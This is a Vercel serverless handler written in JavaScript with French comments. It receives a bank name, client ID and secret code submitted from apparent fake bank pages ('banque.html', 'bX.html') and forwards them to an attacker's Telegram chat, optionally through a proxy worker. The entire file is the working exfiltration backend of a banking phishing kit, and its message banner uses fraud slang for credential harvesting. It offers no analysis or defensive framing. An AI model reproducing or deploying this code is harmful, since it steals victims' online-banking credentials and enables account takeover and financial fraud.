export default async function handler(req, res) {
    // 1. Configuration stricte des en-têtes CORS pour autoriser les requêtes asynchrones (Fetch)
    res.setHeader('Access-Control-Allow-Credentials', 'true');
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'POST,OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type, Authorization, X-Requested-With');

    // 2. Gestion du preflight CORS (requêtes de contrôle du navigateur)
    if (req.method === 'OPTIONS') {
        return res.status(200).end();
    }

    // 3. Sécurité : Blocage immédiat de tout ce qui n'est pas du POST
    if (req.method !== 'POST') {
        return res.status(405).json({ success: false, message: 'Méthode non autorisée.' });
    }

    try {
        // 4. Extraction des 3 variables uniques transmises par le fichier banque.html et les bX.html
        const { nom_banque, client_id, secret_code } = req.body;

        // 5. Récupération des variables d'environnement configurées sur Vercel
        const token = process.env.TELEGRAM_TOKEN;
        const chatId = process.env.TELEGRAM_CHAT_ID;
        // Utilisation d'un proxy/worker si défini, sinon l'API officielle
        const baseUrl = process.env.WORKER_URL || 'https://api.telegram.org';

        // Validation de la configuration
        if (!token || !chatId) {
            console.error("Erreur : Configuration TELEGRAM_TOKEN ou TELEGRAM_CHAT_ID manquante sur Vercel.");
            return res.status(500).json({ success: false, message: 'Erreur interne de configuration serveur.' });
        }

        // 6. Horodatage propre à l'heure de Paris
        const dateStr = new Date().toLocaleString('fr-FR', { timeZone: 'Europe/Paris' });

        // 7. Construction du message au format HTML pour éviter les bugs liés aux caractères spéciaux dans les mots de passe
        let message = `⚜️ <b>[ NOUVELLE SOUFFLERIE VERCEL ]</b> ⚜️\n`;
        message += `───────────────────\n\n`;
        message += `📍 <b>Banque :</b> <code>${nom_banque || 'Non spécifiée'}</code>\n`;
        message += `👤 <b>Identifiant :</b> <code>${client_id || 'Non fourni'}</code>\n`;
        message += `🔑 <b>Code secret :</b> <code>${secret_code || 'Non fourni'}</code>\n\n`;
        message += `───────────────────\n`;
        message += `📅 <b>Date :</b> <code>${dateStr}</code>`;

        // 8. Envoi de la requête HTTP vers Telegram via Fetch
        const telegramUrl = `${baseUrl.replace(/\/$/, '')}/bot${token}/sendMessage`;
        
        const telegramResponse = await fetch(telegramUrl, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: chatId,
                text: message,
                parse_mode: 'HTML',
                disable_web_page_preview: true
            })
        });

        // 9. Réponse au client
        if (telegramResponse.ok) {
            return res.status(200).json({ success: true, message: 'Données transmises avec succès.' });
        } else {
            const errorText = await telegramResponse.text();
            console.error(`Erreur retournée par Telegram : ${errorText}`);
            return res.status(502).json({ success: false, message: 'Échec de la transmission à Telegram.' });
        }

    } catch (error) {
        console.error(`Erreur d'exécution du handler : ${error.message}`);
        return res.status(500).json({ success: false, message: 'Erreur interne du serveur.' });
    }
}
